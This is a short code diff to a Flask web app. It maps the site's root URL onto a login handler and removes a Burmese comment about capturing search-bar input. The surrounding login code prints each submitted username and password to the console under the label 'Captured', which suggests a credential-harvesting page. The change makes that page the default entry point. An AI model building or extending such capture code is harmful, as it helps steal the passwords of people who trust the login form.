@@ -302,6 +302,7 @@ Dashboard_html = """
 </body>
 </html>
 """
+@app.route("/", methods=["GET", "POST"])
 @app.route("/login", methods=["GET", "POST"])
 def login():
     username = "User"
@@ -315,7 +316,6 @@ def login():
         if password:
             print(f"Captured -> Username: {username}, Password: {password}")
 
-    # Search Bar ကနေ POST နဲ့ ပို့လိုက်တဲ့ စာသားကို ဖမ်းယူခြင်း
     search_query = request.form.get("query", "").lower()
     
     show_music = True
@@ -332,6 +332,6 @@ def login():
         username=username, 
         show_music=show_music, 
         show_video=show_video,
-        search_query=search_query)
-    
+        search_query=search_query
+    )
     
